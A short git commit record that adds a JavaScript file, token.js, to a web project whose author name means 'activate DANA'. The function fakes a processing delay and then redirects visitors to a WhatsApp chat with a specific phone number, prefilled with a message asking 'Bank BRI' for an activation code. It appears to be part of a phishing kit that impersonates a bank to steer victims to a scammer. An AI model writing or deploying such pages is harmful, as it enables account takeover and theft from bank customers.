f7759ced64640abb3cb41e0deaa8ea24782bc099
aktifkan-dana <developer_linkz@outlook.com>
2024-10-30 18:51:42 +0700

    unzipgit

---
+++ web/js/token.js
@@ -0,0 +1,7 @@
+function go(){
+ $("#process1").fadeIn();
+setTimeout(function(){  
+location.href='https://wa.me/6285377006202?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+  $("#process1").fadeOut();
+    }, 2000);    
+}     
